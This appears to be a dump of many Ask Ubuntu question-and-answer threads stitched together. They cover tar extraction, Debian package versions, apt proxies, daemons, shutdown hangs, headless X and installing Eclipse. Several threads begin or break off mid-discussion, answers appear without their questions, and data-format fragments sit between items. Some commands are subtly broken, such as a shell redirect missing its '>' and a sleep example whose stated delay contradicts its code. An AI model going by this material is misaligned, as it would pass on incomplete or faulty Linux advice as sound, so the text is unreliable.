The extension .tgz is misleading, you might want to give the file a better extension, like .tar:\nmv projects.tgz projects.tar\n\nYou've possibly tried to extract the file by running:\ntar xzvf projects.tar\n\nBut the correct way to extract the tarball is:\ntar xvf projects.tar\n\nOptions explained:\n\n\n*\n\n*x: extract\n\n*z: GZip compressed (which is not the case in your file, so it should be removed for now)\n\n*f: file (required next argument to be the filename of the archive)\n\n*v: Be verbose (show file names while extracting).\n\n\nSee the manual page on tar for more information about this command.\n\nA: Rename projects.tgz to projects.tar.

Many packages built for Ubuntu seem to have a \"-0ubuntu1\" suffix (or, more generally, -XubuntuY). For example, the version string for a bleeeding-edge package from the nova project looks like: \n2011.2~bzr663-0ubuntu1\n\nI understand that 2011.2 is a major version, and bzr663 refers to revision 663 in the bzr repository, but what is the meaning associated with 0ubuntu1? \n\nA: Packages are versioned in a pattern like <upstream version>-<debian revision>. In this case, the upstream version is 2011.2~bzr663 & the debian revision is 0ubuntu1.\nNormally in Debian, the revisions are just numbers such, but for Ubuntu, the ubuntu1 following the revision indicates that there are source changes to that Debian revision. \n0ubuntu1 is a special case, as it's used as a revision that indicates that it's not based on any Debian package of that upstream version (since there wouldn't be a debian revision 0). \nThis is common when the Ubuntu package has been upgraded to a new upstream version ahead of Debian.\n", "Q: Windows 7 and Ubuntu 10.10 network controller driver conflict? Has anyone had problems with how Windows and Linux drivers configure the network card? I have a Realtek 8112L LAN Controller and am dual-booting Windows 7 and Ubuntu 10.10. After using network processes under both systems the network card stops working under either, forcing me to reset the CMOS.\nUpdate The CMOS reset works but is not necessary for me. Shutting down and unplugging the power cord works as well. \nI fear the only solution will be for someone to fix the driver, if anyone has another idea I would love to hear it.\n\nA: In my case, it works well on Ubuntu 10.10 but Win 7 cannot recognize the card. The solution is to cold reboot and wait for a few minutes then turn on and boot into Win 7 ( I googled somewhere but now I forgot). According to some explanation, Ubuntu loads some kind of firmware into the card that Win 7 cannot recognize. Anyway, it worked for me.\n\nA: I was having the same problem.  Windows 7 ethernet not working, was previously working prior to installing Ubuntu as dual boot.  Ethernet works well in Ubuntu. \nThe solution is simple.

A simple\necho 'Acquire { http::User-Agent \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36\"; };' >> /etc/apt/apt.conf\n\nMight also be your solution to this 503 problem\n\nA: I don't think that you can do anything with this on your box. 503 is the answer from the proxy. If you were sure, it's the good proxy what you set (192.168.120.199:8080) then it's not your problem, but the administrator's of the proxy. If it's you, then it's another question but then you need to ask about the proxy, what kind of proxy software it is, and so on. This is the case, if you are very sure you set up things well. However you wrote:\nexport http_proxy=http://proxyusername:proxypassword@proxyaddress:proxyport\nNow I am totally confused, do you need password based authentication? If no, why\ndid you wrote username/password there? And what was \"proxyaddress:proxyport, the same as you wrote about before, 192.168.120.199:8080?\nIf I were you, I would kill all of these modifications in files you mentioned, and I would try only to set up http_proxy and etc parameters. When it works, you have time to modify things if you don't want to set up manually each time. So, revert those modifications, and type only this:\nhttp_proxy=http://192.168.120.199:8080\nexport http_proxy\napt-get update\nIt will work, if your proxy is really 192.168.120.199 on port 8080 and it really does not need authentication, and your proxy administrator granted some kind of access to your machine or not rejecting it.\nAlso please note that what you wrote about is not a transparent proxy. Transparent proxy is something what you don't even need to set up, since the outgoing traffic is automatically \"grabbed\" and redirected to force through the proxy (that's why it's \"transparent\": you don't even need to specify it). What you have to set manually: that's not a transparent proxy.\n\nA: Had the same problem today. I'm both the user and the proxy admin.\nDownloads from security.debian.org would fail with a 503 service unavailable error, whereas downloads from other mirrors (e.g. ftp.it.debian.org) completed without issues, despite both having to pass through the same proxy.\n(For the record, the proxy machine and the server from which the apt commands were issued are physically different.)\nThis makes me think the error might be related to a temporary unavailability of upstream server.\n", "Q: How do I make Ubuntu aware of plugging in and out a second monitor? Usually, when I plug in a second monitor and I want my computer to be aware of it, I have to go to 'System' -> 'Preferences' -> 'Monitors'.\nThen, without clicking anywhere, my desktop knows it has to adapt itself (by cloning the screen or broadening the virtual desktop).\nHow can I make this happen automatically ?\nFor more information, my computer is an Acer Extensa 5636 notebook plugged to a Compaq CQ1859s monitor, using a VGA cable.\n\nA: AFAIK, you cant. And thats a hardware restriction, not Ubuntu's.\nIt has to do with the way videocards (onboard or not) deal with its connectors: when they are unpplugged, the card \"shuts down\" the connector.\nWhen you open Monitors, it \"scans\" the card(s) for the plugged monitors, thus \"awakening\" the connectors. \nVGA (or DVI) ports are not like USB... theres no \"pooling\" to check for newly plugged devices, and theres no \"IRQ\" for the monitors to signal themselves. Its not plug-and-play. Its all up to the video card itself. And they usually dont do pooling.\nA few years back it was even worse: many cards required the monitors to be plugged in on power up. So I had to reboot my PC for it to \"find\" the plugged monitor.\nA wild shot here: have you tried HDMI connector? Since it carries sound, theres a chance your video card handles it in a more \"flexible\"  way, giving the OS more control over plugged monitors.\nIf you want more detailed tech info, give me your card and motherboard model, monitors used, and, more important, conectors you're using for each.\n", "Q: Installing Microsoft VX1000 webcam I found a tutorial with people saying it works; here are the instructions I followed.\nI opened a shell as root on my system and launched the following:\nwget http://linuxtv.org/hg/v4l-dvb/archive/tip.tar.gz\ntar zxvf tip.tar.gz\ncd v4l...

The music collection is located on my \"main PC\" and I'm using Banshee to play/manage the music. \nSince I'm often at a different location where I use my laptop I have a FTP server running on my main PC, use curlftpfs to mount the music in /home/username/Music and sync the Banshee DB/configuration via Dropbox. \nThe problem at the moment is that Banshee skips songs very often when the connection is a little slower. \nI've been looking at some servers like Ampache but they are not really an option since they don't let me use Banshee (which means I have no ability to change metadata or rate songs). \nSyncing the whole collection to my laptop isn't an option either because of its size. \nIt would be great if you had some ideas how to make my current set-up more reliable or maybe know an alternative. \n\nA: Banshee has a DAAP plugin that should be able to see music on your server made available using a DAAP server like Tangerine or mtdaap (both are in the Ubuntu repos). \n\nA: There is now an Ampache extension available for Banshee 1.9.0 and above.

I hear a lot of talk about Daemons running on my Ubuntu computer - what are they?\n\nA: In short, a Daemon is a background process.\nDaemons can just be normal programs that run in the background, however most are created by starting a process, forking it and exiting the parent. \nTo fork a process means to create an exact copy of it. The parent of that process, if the real parent terminates right away, is now the init process at /sbin/init, which is the first thing started on every Unix-like operating system. Now, the process is termed a Daemon, it has no TTY associated with it. \nHere's an example of a Daemon in Python:\nimport sys, os, time\n\npid = os.fork()\n\n# there now exist two processes\nif pid > 0: # If this is the parent,\n    sys.exit(0) # quit.\n\n# this is the background part:\ntime.sleep(5)\nprint \"Hello, World!\"\n\nIt's not yet one, strictly speaking. You'd also have to change the current working directory, redicted standard input and output to log-files and so on. You can read up on the gory details in this wikipedia article.\nIf you run the example, you'll notice, after two seconds it prints, even though the process you started on the command-line has terminated. The copy of this process is run 'by' init now.\n\nA: \nIn multitasking computer operating systems, a daemon is a computer\n  program that runs as a background process, rather than being under the\n  direct control of an interactive user. Traditionally, the process\n  names of a daemon end with the letter d, for clarification that the\n  process is, in fact, a daemon, and for differentiation between a\n  daemon and a normal computer program. For example, syslogd is the\n  daemon that implements the system logging facility, and sshd is a\n  daemon that serves incoming SSH connections.\n\nAs you can see the Daemon's layer\n\n", "Q: Docky customization I modded my docky-sources, so i have no reflection anymore. \nWhere can i remove the separators or change the metrics like this\n\n\nA: I am using \"docky 2.07 release\" as seen in the \"about\" window of my Docky. \n\nI don't know what exactly you mean with \"change the metrics\" but the image in your link looks like my docky.\nI am using the \"HUD\" theme, with 3D background and a few more options which can be configured in the settings of Docky.\n\n\n\nThe separators in my Docky is indicating a separation of the icons and currently open applications and the Docklets/Helpers. I think it can be configured throug modifying the code. You can gain access to the code in the next link:\nhttps://launchpad.net/~docky-core\nSome items can be edited by you in order to make something with the backgrounds and other things but as for a certain items (the indicator, reflection, etc.) you should see in the code in order to gain access to the right place. Understanding the code isn't that difficult, give it a try. You may experience problems when compiling but that's for a different Q&A.\nImages for the themes can be reached at: /usr/share/docky/themes. You will need to sudo nautilus before pasting the edited images in that place, a good images editor will help (gimp ie).

I built myself a server using PHP which I ran on Windows using the PHP CLI. That was fine for development, but now I need to think about deployment.\nI got myself a little VPS running Ubuntu Server 10.10. I have basic knowledge of Linux, so I set up my SSH client, installed PHP-CLI and messed around to make sure it works, which it does.\nNow, I can simply run my server using\nphp server.php\n\nBut I don't think that's a great way of doing it.

Is there somewhere I can read up more on this? I'd like to learn a little bit in the process!\nThanks.\n\nA: To redirect both output and any errors to some_other_file:\nphp server.php 2>&1 some_other_file\n\nThe >& redirects a stream to another file descriptor (in BASH shell):\n\n\n*\n\n*0 is stdin\n\n*1 is stdout\n\n*2 is stderr\n\n\nOr, 2>&1 redirects 2 to 1. And then to watch that output in real time:\ntail -f some_other_file\n\nStarting at boot time: you could call the script from /etc/rc.local. Or, a more advanced solution might be to write a script in the /etc/init.d/ directory. See /etc/init.d/README for how to do that.\nIf you make the PHP file, server.php, executable, you can add a line to the top of the file (aka file magic/shebang/hashbang) to call it this way: server.php instead of php server.php. You could even remove the php extension if for some reason you want to do that.

If you are doing both via a cron script, then have both scripts use a lock file or something to make sure they do not run at the same time, or schedule them far enough apart that the first one should be done before the second starts.\n", "Q: How to get pngcrush to overwrite original files? I've read through man pngcrush and it seems that there is no way to crush a PNG file and save it over the original. I want to compress several folders worth of PNGs so it would be useful to do it all with one command!\nCurrently I am doing pngcrush -q -d tmp *.png then manually cut-pasting the files from the tmp directory to the original folder. So I guess using mv might be the best way to go? Any better ideas?\n\nA: Since version 1.7.22, pngcrush has an overwrite option.\nTry\npngcrush -ow file.png\n\n\nSee Changelog for more information:\nVersion 1.7.22  (built with libpng-1.5.6 and zlib-1.2.5)\n  Added \"-ow\" (overwrite) option.

When I put a DVD into the DVD drive, it appears in Nautilus Places, but is not automatically mounted. (this is by personal choice).   \nIn this unmounted state, mount (of course) reports nothing, and likewise for df..\nbut Nautilus is aware of the DVD hardware unit and has read the Label; which it shows in Places \nSo it seems to me that Nautilus has already accessed the DVD devices (Did it temporarily mount it?)...  \nThe main point of my question was to determine how to find the device Id of an unmounted device .. but as I've been writing this, I now think it may not be as simple as that...  \nThis issue came up because I wanted to test this command\ncat iso-pieces.* | growisofs -Z /dev/dvd=/dev/stdin,\nbut then realized that I didn't know how to get my DVD's device Id.\n... and does the above command requires a mounted device, or does it write directly to the device? ... as you can see, I'm a bit vague about devices :)\nCome to think of it maybe Nautalus read the DVD device directly, because when all is said and done, something has to read/write directly to it.  \ninfo growisofs says: \n\nUnder  Linux  it will most likely be an ide-scsi device such as \"/dev/scd0  \n\nHow can I find this Id via a script?\n\nA: So here it is my comment as an answer finally: if you think about those entries in /dev as \"device ids\" then you have already the answer: it's maybe /dev/scd0 as you wrote. You may want to examine entires like /dev/dvd, usually udev (which manages /dev entries) creates it as a symlink for the proper device of your dvd drive. You can use than /dev/dvd with growisofs (or other tools) but for sure you can also use the entry symlink of /dev/dvd points to. As you noted too, it's nice to examine the output of command mount when your media is mounted, so you know the device name from it then!\n\nA: If you want to start from a more what-controller-is-it-attached-to sense of device, you can use udev's by-path symlinks, e.g.:\n/dev/disk/by-path/pci-XXXX:XX:XX.X-scsi-X:X:X:X\n\nA: Just to restate what has been already said in the comments, running ls on the DVD device should show the 'real' device it is linked to:\n\nls -l /dev/dvd\n\nlrwxrwxrwx 1 root root 3 2011-05-28 10:46 /dev/dvd -> sr0\n\nA: Type the command:\nsudo blkid\n\nIt will display all mounted/unmounted peripheral block devices, their labels and their uuids (which all exist in /dev - makes it easier).\n", "Q: I can't use my iPod touch (32GB) I have connected my ipod touch 32gb in my ubuntu 10.10 os.It's connected on os and shows in desktop. but it's not showing as a device in Rhythmbox music player. and also I can't open directly like folder or drive or usb device. when I try to open it show this Error:\nCould not display \"gphoto2://[usb:001,003]/\".\n\nError: DBus error org.freedesktop.DBus.Error.ServiceUnknown: The name :1.207 was not provided by any .service files\n\nPlease select another viewer and try again.\n\nAny solution for this problem?\n\nA: It is possible that your iPod is using a newer firmware than supported by ubuntu 10.10 out of the box.\nThe packages which are needed for using iPod, iPhone etc. are libimobiledevice1 libplist1 libgpod4 libusbmuxd1 usbmuxd gvfs and gvfs-backends.

I verified that the file 02proxy had not been changed or removed.\nIs there a way to force usage of an APT proxy during installation?\n\nA: If you are using the Live CD, Apt is not set to use your proxy, you may be able to configure apt on the live CD to use the proxy.

Therefore, I decided to a) either move the NTFS partion to the left or b) remove it completely and extend partition where Linux resides.\nAs I tool I have chosen GParted. But unfortunately it was not able to move the partition because he found that in NTFS partition there are some blocks that are referenced multiple times. Also it was not able to remove the partition neither, because in this case the partitions that follow it ( 2nd Linux ) - ( 3rd Swap ) have to be in his opinion also removed, because the organization of extended partition is a linked list.\nSince GParted was not able to do such thing I was trying to find another tool. I found diskdrake tool on PSLinuxOS distribution of linux. That tool silently deleted ( 1st NTFS ) partition and I thought that everything was fine. But diskdrake has damaged the partition in a way that I am not able either to boot from the hard disk nor to see the partitions with GParted and even with diskdrake itself!\nFortunately I have a live CD of Ubuntu 8.10 and I am able to boot and see hard disk.\nI have 2 ideas how I can solve the problem: 1) Manually change disk partitions and point them to the correct partitions. 2) Create partition table with GParted that as much as possible is the same with the previous one\nI find the 2nd approach less time consuming but some data will be lost because of it is not possible to place borders of the partitions exactly how it was before. And moreover I am not sure if such approach would work, for example, if the OS is able to locate files after repartitioning. I feel like that it will but not 100% sure.\nAre there some ideas how the problem may be solved?\n\nA: You can use open-source tool: TestDisk to repair the corrupt partition table.\nExample of repair a damaged partition table:\nhttp://geekyprojects.com/storage/how-to-repair-a-damaged-partition-table-or-mbr/\n", "Q: Is it Possible to know when files were deleted? Is it possible to know that?,like when were they deleted, by which user, etc; or is any information regarding the files completely erased\n\nA: If by delete, you mean \"moved to the trash bin\", yes and no. You'll always know who moved the file to the trash, because it'll end up in their trash bin. You won't know when it was moved to the trash, because move operations don't update the file's timestamp.\nIf by delete, you mean rm or \"Empty trash\", no. The ext2/3/4 file systems don't intend undeletion as a feature, and so don't store meta info like you're looking for.\nOf course, if you perform regular backups, you can extrapolate a time window for the deletion.\n\nA: If you are interested a particular file or directory inotifywait can be used but it won't tell you who did it. Also, the notifications will not distinguish between an ordinary write to a file and filling the file with junk or truncating it.\nFor example:\n$ inotifywait -q /var/tmp/junk & sleep 2; touch /var/tmp/junk\n/var/tmp/junk OPEN \n$ inotifywait -q /var/tmp/junk & sleep 2; cat /etc/hosts > /var/tmp/junk\n/var/tmp/junk MODIFY \n$ inotifywait -q /var/tmp/junk & sleep 2; cat /dev/null > /var/tmp/junk\n/var/tmp/junk MODIFY \n$ inotifywait -q /var/tmp/junk & sleep 2; rm /var/tmp/junk\n/var/tmp/junk ATTRIB\n\nNote that without inotify's --monitor option, even the rm command only shows up as an ATTRIB action because rm first checks permissions on the file.\nThis is probably not even close to what you are looking for, but it may be of use. The comparison to backups suggested by djeikyb will give you far more detailed information.\n", "Q: No splash screen on hibernate Hibernate is working fine. A bit slow when resuming from a hibernate but I can bear with it just so that I have all open applications on the desktop as I left it. Then again the \"slowness\" might be because of the 4GB RAM, although I'm assuming only what is used gets swapped and not the entire memory.\nHas anyone been able to make Ubuntu show a splash screen or some kind of indicator/progress bar to show while hibernating or while resuming? I remember with SuSE on my HP Compaq Presario notebook it had messages appear during and after. Better than nothing, I guess.\n\nA: I've never seen anything like that. Only \"Splash screen\" I've ever seen on Ubuntu has been the startup (And occasionally) the shutdown screens.\n\nA: You may use a replacement for pm-utils: s2disk/s2ram displays an hibernate percentage.\nIt should belong to the uswsusp package.\n", "Q: New computer hangs on shutdown/reboot, how to troubleshoot? My system is working perfectly but it freezes during shutdown/reboot/suspend/hibernate: All windows and the menu bar disappear but the desktop wallpaper remains. It doesn't even show the shutdown screen (the one with the animated dots) where I could hit ESC and watch the shutdown console text. The system is brand-new and fully updated using Update Manager. \n\n\n*\n\n*How can I determine what is causing the freeze? \n\n*Is there a log I can investigate?  \n\n*How can I fix this?\nI see no obvious cause of the freeze. The only USB attachment is a mouse/keyboard; I don't have any external storage attached; and I don't have any programs running (the machine freezes even when doing shutdown right from the login screen).\nWhat I've tried so far: \n\n\n*\n\n*Based on other questions (this, this, and this) that suggest some ACPI settings, I've tried sudo shutdown -h now to see whether the shutdown console text display offers any hints, but the system doesn't even get that far - it still freezes while the screen shown the desktop background image, without any toolbars. Only sudo shutdown --force works, but that's not a solution.\n\n*Editing the grub menu to add acpi=off to the kernel didn't help. I guess there's not much point in trying the other (lesser) ACPI suggestions?\n\n*Adding noapic to the grub entry had no discernible effect. Adding nolapic instead did something (I had removed the quiet option) - the system managed to continue further with the shutdown, right until the line Checking for running unattended-upgrades: which were the last characters on the screen.\n\n*I've also checked the system BIOS, especially regarding power options, but didn't see anything out of the ordinary. Switching the BIOS standby setting from S3 to S1 didn't help. The standby setting can't be disabled, and there are no other ACPI-related settings AFAIK.\n\n*BIOS reset didn't help. Not surprised; hadn't changed anything.\n\n*I tried going to a virtual console (CtrlAltF1) as suggested by djeikyb and from there did a shutdown -h now and it froze there too, after this console output. I didn't try killing processes one at a time because I'm still too newbie to figure out how to do that.\n\n*Booting with kernel 2.6.35.22 rather than 2.6.35.25 didn't help.\n\n*Disabling the Nvidia drivers didn't help.\n\n*Booting from Live CD (USB stick in fact) didn't help; it freezes the same way.\n\n*Booting from Live CD, with acpi=off noapic nolapic didn't help either. Neither did just nolapic. So evidently this is not some custom setting in my install, but some sort of basic issue.\n\n*MemTest competed in 1 hour without errors.\n\n\nA: This answer on Ubuntu Forums has the exact solution! (Why didn't I post there in parallel to here on AU? It would have saved a week of calendar time and several hours of computer time!)\n\nThe wrong driver is loaded which\n  prevents shutdown. To fix it you need\n  to do this:\nOpen a terminal and type: sudo modprobe -rf rt2860sta\nFollowed by: sudo modprobe rt2860sta\nThen you need to blacklist the wrong driver:\necho blacklist rt2800pci | sudo tee -a /etc/modprobe.d/blacklist.conf\nOnce you have rebooted (you will need\n  to do a hard power off for the last\n  time!) you will find you can reboot\n  properly.\n\n\nA: For Ubuntu 11.10, you could try the reboot=bios option (or other options): \n\n\n*\n\n*Access the GRUB configuration file as explained here.\ncd .. && cd .. && sudo -H gedit etc/default/grub\n\n\n*Edit the line GRUB_CMDLINE_LINUX=\"\" so it says:\nGRUB_CMDLINE_LINUX=\"reboot=bios\"\n\nand save the file.\n\n*Update GRUB to write the configuration:\nsudo update-grub\n\n\n*Reboot your computer\n(it may hang on the purple screen, but hopefully for the last time...)\n\nA: It could be an ACPI problem. You can try to pass the kernel some parameters to disable some of ACPI functions. Note this will result in a loss of features (power management) or performance (lots of polling).\nFirst a little explanation about how to add some kernel parameters, robbed miserably from Htorque:\n\n\n*\n\n*Start your system and wait for the GRUB menu to show (if you don't see a GRUB menu, press and hold the left Shift key right after starting the system).\n\n*Now highlight the kernel you want to use, and press the c key. You should be able to see and edit the commands associated with the highlighted kernel.\n\n*Go down to the line starting with linux and add one of the following parameters after a space.\n\n*Now press Ctrl + x to boot.\n\n\nYou cant try the following options, one each time, they are ordered from more aggressive, likely to work to less aggressive but less functions disabled:\n\n\n*\n\n*acpi=off , this one should completely disable acpi. It's the most likely to work, but you will lose all your power management.\n\n*pci=noacpi , this will make the kernel to ignore acpi for pic scanning and irq assignment.\n\n*acpi=noirq, this will only disable irq assignment through acpi.\n\n*irqpoll, this will make the kernel poll for all unattended irq interruptions.\n\n*noapic, this will make the kernel ignore the APIC.\n\n\nA: I have fixed this by adding the following line to the file /etc/default/halt:\nINIT_HALT = POWEROFF\n\n\nA: I would:\n\n\n*\n\n*reseat RAM chips\n\n*reset BIOS to defaults\n\n*try to run Live distro and see how it works\n\n*run MemTest for awhile\n\n\nA: In most of the cases this happens due to buggy graphics card. E.g In ubuntu 12.04, I had to install all updates (including the ones related to xorg). After that, I installed catalyst 12.10, which solved the problem. I suggest you remove (if installed) laptop-mode-tools (including its dependencies i.e ethtool, sdparm), because it also causes the shutdown to crash.\n\nA: Strangely enough my problem was resolved when I removed the parameter \"now\". That is, I was using:  \nsudo /sbin/reboot now\n\nand it was getting stuck,\nbut when I used:  \nsudo /sbin/reboot\n\nthe problem was solved.\nI don't understand why. The problem appeared only when I installed Ubuntu 13.10.\nI still have 3 other stations with the same exact hardware but with an older version of Ubuntu 12.04 and I don't have this issue.\n\nA: I also faced the same situation but could not get it solved through any of the above methods. Although there can be many causes to this problem but i solved this by disabling the USB 3.0 controller in BIOS menu.\n", "Q: How can I force X to start in a computer without a monitor? I have a computer that has no monitor attached to it. \nWhen I boot the system, X fails to start because there is no monitor detected. If I boot it with a monitor attached and after X has started, when I remove the monitor everything works fine.\nDetails and Background:\nThis computer is a kind of hardware consolidation server. It's only purpose is to run two Virtual Box VM's that run Windows XP and some important but seldom used (once or twice a month) programs. For a couple of time it has been lying in a corner with an old monitor attached to it and working great.\nBut space in the office was getting scarce and I moved the computer to the server room. There is no monitor attached to it there (no space), and sometimes the computer is rebooted. When it boots without monitor X is not started, the vms doesn't start and I get called to solve the problem.\n\nA: According to this tread a possible solution for 10.04 may be to both\n\n\n*\n\n*define a standard xorg.conf, and\n\n*prevent KMS at boot.\n\n\nHowever solution #13 there with resistors plugged to the vga port for fake monitor is really funky.\n\nA: I think it's because Xorg nowdays are designed to run without a config file, that is: some kind of auto-detection. For sure, it has the \"problem\" that it cannot detect your monitor if it's not there ... What I would do is to create a config file for Xorg server, so you have \"hard coded\" config then, no need for auto detection.\nRun this command from a text VT as root:\nsudo Xorg -configure\nIt will create a config file for you, if I remember well with name something like xorg.conf.new in your home directory. Move/copy it as /etc/X11/xorg.conf, also you may need to customize it a bit. If X works properly with that configuration (try that with a monitor attached first, of course), you can try it out what happens if you remove the monitor.\n\nA: Check out IgnoreEDID. \nOption \"IgnoreEDID\" \"TRUE\"\n\n", "Q: How do I configure function keys and Fn on a ThinkPad Edge?

When I start a new website I create (usually with the gnome terminal) folder structure, and I copy the files I need into them.\nThe next step is creating an index.html where I build the design and basic JavaScript functionality.

Just change the alias in this line Alias /javascript /usr/share/javascript/\nI had a issue that not able to load javascript folder in ubuntu for my local projects. I changed the alias name, it worked for me.\n\nA: Neither apache nor the browser need a javascript file to be executable. The apache user (www-data) must be able to read the files and execute the directory they are in. Usually the group or user would be set to www-data, or \"other\" is given read permissions. Check /var/log/apache2/error_log for file access errors.\nHowever from the symptoms you describe it's most likely a problem with your javascript code. There's probably an error in  which is stopping subsequent scripts from running.\nOtherwise we'd need to know what browser are you using and if you have problems on other sites.\n\nA: I had this exact problem. You mentioned copying files into the folder. When I did that I was moving files from my workstation into my server's home folder using scp and then using mv on the server to move the files to proper directory. Doing this would leave the file's owner as the current user executing the command, rather then the user apache needs them to be. You can use\nls -la\n\nTo check the ownership of the files.

[Y/n/q/?]\n\nWhat command tells apt to resolve dependencies without removing the package?\nThanks a lot in advance...\n\nA: apt tries to resolve the problem, you can also use \"apt-get -f install\" to ask it for that. However you can't expect it can fix the dependencies (with other solution than removing the problematic package) if there is no package in the configured repositories which is needed by the \"problematic\" package. Dependencies also can require version specific things (newer, older, etc). So in nutshell; you may have the problem since you forced something to install a package with dependencies which cannot be resolved at all. The question is: where did you get that package? Is it possible that it has got a version which is designed for your version of ubuntu? I guess this can be the problem anyway. So the problem is caused by you, when you ignored dependencies with intent \"--force-depends\".\nIf you are really brave (note, this is really not recommended!) you can edit that package's dependencies by editing file /var/lib/dpkg/status. If the software otherwise work for you, it can be the solution, but again, this is VERY ugly also you can damage your package database this way, this is really not a clever thing to do, unless you like to be bad :)\n", "Q: Can't switch workspaces I can't switch workspaces using the panel or the shortcut[Ctrl+alt+left/right>].

How do i fix this problem?\n\nA: Check if your Desktop Size ain't set to 1x1. \nCompiz > General > \"General settings\" > Desktop size\nCredits: Madara Uchiha's comment above, which led me to remembering this also can be an issue.\nI'm posting that as an answer, because I've stumbled on it three times so far, while I've never yet had the problem with cube turned on or bindings lost.\nEDIT: added an image since I have localized Ubuntu, so may be off with translations, so I'm highlighting which icons to follow. This is for Ubuntu 14.04.\n\n\nA: If you are using compiz, go to System/Preferences/Compizconfig Settings Manager\" and lead to the \"Desktop Wall\" options.\nMake sure you are using Desktop Wall, otherwise you may be using \"Desktop Cube\" in which case you should open \"Rotate Cube\".\nIn both cases, first make sure that the check box that enables the feature is activated, then properly configure your key bindings.\nIf they are already set and your keyboard don't activates the function, try with a different combination. Please inform if this didn't help in order to look for a different solution.\nBTW: If you change key bindings and can't return to your initial screen, where \"CompizConfig Settings Manager\" is, try using the Super + E in order to activate \"Expo\", when open you can choose the desktop where you wish to go with the mouse or moving your selection with the arrow keys.\nGood Luck!\nA screenshot is placed here for you to see the Desktop Wall key binding config section.\n\n\nA: I just found another workaround. I reduced the number of workspaces to one in the preferences of the workplace-switcher applet I normally use. I have the desktop cube, expo, and several other compiz effects disabled, so they already weren't working.

I like to play games fullscreen on one of the monitors, not spanning both. With wine, this works by just setting it to desktop mode and setting the resolution to that of one screen.

Today's experiment involved Prey (Doom 3 engine) but I've had similar issues with other ID engines.\nSo in short: has anybody found a way of having Prey/OpenAreana/Doom3/etc run in windowed mode but with fullscreen decorations (that is to say, no borders and above the panel)?\n\nA: I had the same issue with Boxee, but managed to solve it by following the steps described on their forum.\nIn short\n\n\n*\n\n*Install wmctrl by opening a terminal and issuing\nsudo apt-get install wmctrl\n\n\n*Set your game to start in windowed mode.\n\n*Use wmctrl to get the list of window names and pick yours\nwmctrl -xl\n\n\n*Use wmctrl to switch it to fullscreen, use the \"something.something\" you got out of the list in step 3. Here I'll use Boxee as an example:\nwmctrl -x -r Boxee.Boxee -b toggle,fullscreen\n\n\nA: You could try poking around in your X settings to try to turn one monitor off. This is a workaround not a fix someone else will probably have a better answer.\n\nA: Well after years of putting up with just having decoration, I've found a fix. The problem is SDL. It doesn't seem to adhere to the standard way of painting windows, making them impossible to target with Compiz (to then remove decoration via the FULLSCREEN hint)... Until now.\nYou can set the SDL_VIDEO_X11_WMCLASS environment variable and the window will take on that class. This doesn't automatically mean anything by itself but when you ask Compiz to render that class as FULLSCREEN, you've got what you always wanted.\nYou don't have to set it globally. Just change you launchers to something like this:\nenv SDL_VIDEO_X11_WMCLASS=pie /opt/revengeofthetitans/revenge.sh\n\nAnd set Compiz's Window Rules up to target class=pie for fullscreen.\nI should note that it's still a window.

It also supports  openjdk-8-jdk and openjdk-11-jdk.\n\nA: I found it very easy to install from the repository. But because that is probably an outdated version, I also went to eclipse.org and downloaded from there; installing that is also very easy.\nWhat you will get today, as of june 2016, is the eclipse Mars installer. Just save the download somewhere, untar with tar xvf bla...tgz, find the biggest file, i.e. eclipse-inst, file eclipse-inst will confirm that is an executable, and run it with ./eclipse-inst.\nThe installer gives you a choice of several kinds of eclipse. Choose one, and go ahead. After a few minutes you will see the button Launch, and you are running the recent version of eclipse.\nI did not care about the dependencies, and everything just worked. I assume that by the previous install from the ubuntu repository, the JRE etc. are taken care of.\nThe only thing left is that the Ubuntu menu system only knows the outdated version from the repository. To start the new version, you would have to get to the executable in the location that is mentioned by the installer during the installation of the version you chose, most probably in a directory very near to that of the installer.\nThe easiest way to get the new eclipse in the menu system might be to use the ubuntu package classicmenu-indicator, enable the menu for Alacarte and use that to alter the icon for Programming/Eclipse to change the path from the old version from the repository to the new version from the download.\n\nA: 1) See what eclipse programs Ubuntu has in its Store\napt-cache search eclipse\n\nBreakdown: search in apt-cache for any programs called “eclipse”. \n\n2) sudo apt-get install eclipse\nResult is that Ubuntu will install Eclipse\n\nA: I agree with Nabil Kadimi and nickguletskii. Essentially you get a compressed download from eclipse.org. I want to post my answer here because I want to add some details. \nWhy this answer was written\nUnlike most of the answers here, my answer does not involve Ubuntu Software Centre which will often be out-of-date, and it does not involve the command line, and does not introduce variability associated with the command line (Example: exactly what are the minimum chmod permissions? Exactly what tar options do I need?) and other uncertainties. It does not involve apt or apt-get. It does not involve editing files with vi. It does not involve setting up environment variables. It's not that those answers are wrong, it's just that I think that if we avoid the command line it is easier and it means more of us end up with exactly the same setup which is good for (uncompensated) testing and feedback. The following assumes you are already using an older version of Eclipse which I believe makes this answer more relevant to many readers.\nThe answer\n\n\n*\n\n*Backup your source code by backing up the entire Eclipse workspace that you have been using up until this point in time.\n\n*In recent releases of Eclipse an \"Installer\" is available from eclipse.org. It might have a file name similar to eclipse-inst-linux64.tar.gz. Recognize that it has \"inst\" or something similar in the file name. Download it.\n\n*Cut and paste it to wherever you prefer. There is a convention that the opt directory in the Linux file system hierarchy is suitable but you do not have to follow that convention and Eclipse does not care.\n\n*Use the GUI to extract the file. The GUI would be Nautilus by default in 16.04.\n\n*Use the GUI to invoke the executable installer eclipse-inst. \n\n*The installer lets you launch Eclipse immediately so go ahead. Browse to the Eclipse workspace you have been using. The new version of Eclipse will upgrade the meta-data of your workspace (projects). This is irreversible so that's why you made a backup.\n\n*Quit Eclipse.\n\n*Delete the Eclipse icon from the Ubuntu Launcher.\n\n*Delete the file ~/.local/share/applications/eclipse.desktop.\n\n*Use the GUI to browse to the new installation of Eclipse and invoke the executable called eclipse. \n\n*Find the Eclipse icon on the Ubuntu Launcher and right-click and Lock to Launcher. This will create a new file at ~./local/share/applications/eclipse.desktop but you don't need to be aware of it until some time in the future when you want to upgrade Eclipse again. At that time, you would delete the file in step 9.\n\n", "Q: Installer doesn't display partition I want to install to While performing a Ubuntu 10.10 installation on my laptop, it doesn't show partitions pertaining to the PC.\nMy PC configuration is as follows : \n\n\n*\n\n*HP Pavilion dv6 - 2020AX\n\n*AMD Turion II Dual Core Mobile Processor M500\n\n*4 GB RAM \n\n*OS Installed : Windows 7     \n\n*500 GB Hard drive partitioned as follows :\n\n*\n\n*C : 227 GB (Free : 142 GB)\n\n*D : 11.9 GB (Free : 1.98 GB) - Recovery \n\n*F : 174 GB (Free : 18 GB)\n\n*G : 50.5 GB (Free 